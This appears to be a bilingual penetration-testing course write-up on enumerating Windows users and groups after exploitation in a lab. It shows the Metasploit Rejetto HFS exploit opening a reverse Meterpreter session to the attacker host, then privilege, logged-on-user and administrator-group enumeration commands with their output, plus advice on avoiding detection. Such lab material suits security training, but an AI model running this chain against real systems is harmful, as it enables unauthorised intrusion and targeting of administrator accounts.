---
layout: post
title: "Enumerating Users & Groups"
date: "2023-05-31"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Post-Exploitation
---

# Windows Local Enumeration
## Enumerating Users & Groups
After gaining initial access to a target system, it is always important to learn more about the system like, what user account you have access to and other user accounts on the system.

What are we looking for?
* Current user & privileges
* Additional user information
* Other users on the system
* Groups
* Members of the built-in administrator group

# Windows 本地枚举
## 枚举用户和组
在获得对目标系统的初始访问权限后，了解更多关于系统的信息是非常重要的，比如你可以访问哪个用户账户以及系统上的其他用户账户。

我们要寻找什么？

* 当前用户和权限
* 附加用户信息
* 系统上的其他用户
* 组
* 内置管理员组的成员

## Demo: Enumerating Users & Groups（演示：枚举用户和组）
Why is this important? Firstly, you won't need to get an idea of what privileges you have. Are you an elevated user? Are you the administrator? Do you have NT AUTHORITY\ SYSTEM privileges? That will tie-in to privilege escalation. For example, if you are the administrator user, then you don't need to perform privilege escalation. Another reason why this is so important is primarily because if you gain access to a Windows system and you identify other user accounts on that system that are part of the local administrators group, you can then tailor your attacks to that specific account or you can try and gain access to that specific user account and consequently gain administrative or elevated privileges. 

We also need to identify additional user information like the password policy, the password age, when this user's password expires?

And most importantly, we need to be able to enumerate the user accounts that are members of the built-in administrator group. The built-in administrator group is an administrator group that provides administrative privileges to any members that are part of that group. For example, if we gain access to a Windows system and we currently have access as a non-privileged user account called Bod and we identify another user account called Alice, and we also learned that Alice is part of the local administrators group, then we could potentially try and gain access to the Alice user account to obtain administrative privileges. This is a very important phase of performing local enumeration on Windows.

Target IP Address : 10.2.22.30

```
msfconsole
search rejetto
use 0
set RHOSTS 10.2.22.30
exploit
```

I'm going to be going through this both through meterpreter as well as manually through a command shell.

Enumerate information about the current user.

```
meterpreter > getuid
```

In this case, we can see that we're logged on as the administrator user, which means that we have elevated privileges right out of the box. That will tie into whether or not we need to perform privilege escalation, and in this case, we don't need to do that. You can see how this information all ties into the next phases of the post-exploitation methodology.

Enumerate the current privileges we have, or the current privileges associated with the administrator user. And that will tell us whether we have elevated privileges. And in this case, we have the entire gamut of privileges that you typically associate with a privileged user.

```
meterpreter > getprivs
```

Enumerate the currently logged on users as well as users who have logged on in the past.

And if you're doing this through the Metasploit Framework, one of the modules you can use is a post exploitation module that will display all information pertinent to the current users that are logged on, as well as users that previously logged on.

```
meterpreter > background
search logged_on
use 0
```

List out my sessions.

```
sessions
set SESSION 1
run
```

That is how to perform user and group enumeration with meterpreter.

```
sessions 1
```

Open up a command shell session. Let's take a look at how we can perform the enumeration manually.

```
meterpreter > shell
```

It should provide me with a command shell session.

Enumerate your current user. It'll provide you with the hostname and the current user.

```
whoami
```

Display the privileges that we have. And this will tell us the privileges that we have.

```
whoami /priv
```

List out the currently logged on users.

```
query user
```

It's a really wise to check and see whether any other users are logged on to the system as that could be a potential vector for detection. If you're not careful, you could get detected easily. Always be congnizant of who is logged on the system in addition to yourself.

Identify the user accounts on the system or all other user accounts on the system. `net users` will display all other accounts on this particular system.

```
net users
```

That is how to list out all the user accounts on the system.

Learn more about a particular user like the administrator user that we currently have access to. And you can just substitute that with the username or the user account that you'd like to learn more about.

```
net user administrator
```

```
net users
net user guest
```

Enumerate a list of all other groups on the system, or all groups on the system.

```
net localgroup
```

These are all the local groups on the system. These are tied into services or these particular groups are used for to provide specific users with specific privileges. If a user is part of the Remote Desktop Users group, then it means that, they have the permissions or privileges to log onto a system via RDP or the remote desktop protocol.

However, the administrator account is part of the local built-in administrators group. We could identify other members that are part of the local administrators group. 

```
net localgroup Administrators
```

This is a very important command because it'll tell you what other user accounts are part of this group. And that will give you an idea as to what account you can try and attack or gain access to in order to obtain administrative privileges.

That means that any member of the administrators group will have all the privileges required to have unrestricted access to the target system or domain.

That is how to perform user and group enumeration on Windows.

# Enumerating Users & Groups
## Overview
Goal

This lab covers the process of enumerating users and groups on a Windows target system.

# 枚举用户和组
## 概述
目标

本实验涵盖了在 Windows 目标系统上枚举用户和组的过程。

## 复现视频内容
Target IP Address : 10.0.19.183

Kali Linux : 10.10.16.2

```
root@attackdefense:~# service postgresql start && msfconsole -q
Starting PostgreSQL 12 database server: main.
msf5 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


msf5 > use 0
msf5 exploit(windows/http/rejetto_hfs_exec) > setg RHOSTS 10.0.19.183
RHOSTS => 10.0.19.183
msf5 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.16.2:4444 
[*] Using URL: http://0.0.0.0:8080/CXiRZ9
[*] Local IP: http://10.10.16.2:8080/CXiRZ9
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /CXiRZ9
[*] Sending stage (180291 bytes) to 10.0.19.183
[*] Meterpreter session 1 opened (10.10.16.2:4444 -> 10.0.19.183:49400) at 2023-05-31 07:23:32 +0530
[!] Tried to delete %TEMP%\tWhYGmfYw.vbs, unknown result
[*] Server stopped.

meterpreter > 
```

```
meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator
```

```
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

[Windows Gather Logged On User Enumeration (Registry)](https://www.rapid7.com/db/modules/post/windows/gather/enum_logged_on_users/)

Windows 收集登录用户枚举（注册表）

该模块将枚举当前和最近登录的 Windows 用户。

```
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(windows/http/rejetto_hfs_exec) > search logged_on

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/windows/gather/enum_logged_on_users                   normal  No     Windows Gather Logged On User Enumeration (Registry)


msf5 exploit(windows/http/rejetto_hfs_exec) > use 0
msf5 post(windows/gather/enum_logged_on_users) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                      Connection
  --  ----  ----                     -----------                                      ----------
  1         meterpreter x86/windows  WIN-OMCNBKR66MN\Administrator @ WIN-OMCNBKR66MN  10.10.16.2:4444 -> 10.0.19.183:49400 (10.0.19.183)

msf5 post(windows/gather/enum_logged_on_users) > show options

Module options (post/windows/gather/enum_logged_on_users):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CURRENT  true             yes       Enumerate currently logged on users
   RECENT   true             yes       Enumerate Recently logged on users
   SESSION                   yes       The session to run this module on.

msf5 post(windows/gather/enum_logged_on_users) > set SESSION 1
SESSION => 1
msf5 post(windows/gather/enum_logged_on_users) > run

[*] Running against session 1

Current Logged Users
====================

 SID                                            User
 ---                                            ----
 S-1-5-21-2563855374-3215282501-1490390052-500  WIN-OMCNBKR66MN\Administrator


[+] Results saved in: /root/.msf4/loot/20230531073753_default_10.0.19.183_host.users.activ_803977.txt

Recently Logged Users
=====================

 SID                                            Profile Path
 ---                                            ------------
 S-1-5-18                                       %systemroot%\system32\config\systemprofile
 S-1-5-19                                       C:\Windows\ServiceProfiles\LocalService
 S-1-5-20                                       C:\Windows\ServiceProfiles\NetworkService
 S-1-5-21-2563855374-3215282501-1490390052-500  C:\Users\Administrator


[*] Post module execution completed
```

```
msf5 post(windows/gather/enum_logged_on_users) > sessions 1
[*] Starting interaction with 1...

meterpreter > shell
Process 2840 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\hfs>whoami
whoami
win-omcnbkr66mn\administrator
```

```
C:\hfs>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State  
=============================== ========================================= =======
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Enabled
SeSecurityPrivilege             Manage auditing and security log          Enabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Enabled
SeLoadDriverPrivilege           Load and unload device drivers            Enabled
SeSystemProfilePrivilege        Profile system performance                Enabled
SeSystemtimePrivilege           Change the system time                    Enabled
SeProfileSingleProcessPrivilege Profile single process                    Enabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled
SeCreatePagefilePrivilege       Create a pagefile                         Enabled
SeBackupPrivilege               Back up files and directories             Enabled
SeRestorePrivilege              Restore files and directories             Enabled
SeShutdownPrivilege             Shut down the system                      Enabled
SeDebugPrivilege                Debug programs                            Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values        Enabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Enabled
SeUndockPrivilege               Remove computer from docking station      Enabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege         Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled
SeTimeZonePrivilege             Change the time zone                      Enabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled
```

```
C:\hfs>query user
query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         console             1  Active      none   5/31/2023 1:41 AM
```

```
C:\hfs>net users
net users

User accounts for \\WIN-OMCNBKR66MN

-------------------------------------------------------------------------------
Administrator            Guest                    
The command completed successfully.
```

```
C:\hfs>net user administrator
net user administrator
User name                    Administrator
Full Name                    
Comment                      Built-in account for administering the computer/domain
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/10/2020 9:10:03 AM
Password expires             Never
Password changeable          9/10/2020 9:10:03 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   5/31/2023 1:41:32 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *None                 
The command completed successfully.
```

```
C:\hfs>net user guest
net user guest
User name                    Guest
Full Name                    
Comment                      Built-in account for guest access to the computer/domain
User's comment               
Country/region code          000 (System Default)
Account active               No
Account expires              Never

Password last set            5/31/2023 2:21:45 AM
Password expires             Never
Password changeable          5/31/2023 2:21:45 AM
Password required            No
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Guests               
Global Group memberships     *None                 
The command completed successfully.
```

```
C:\hfs>net localgroup
net localgroup

Aliases for \\WIN-OMCNBKR66MN

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Certificate Service DCOM Access
*Cryptographic Operators
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Print Operators
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Users
*WinRMRemoteWMIUsers__
The command completed successfully.
```

```
C:\hfs>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
The command completed successfully.
```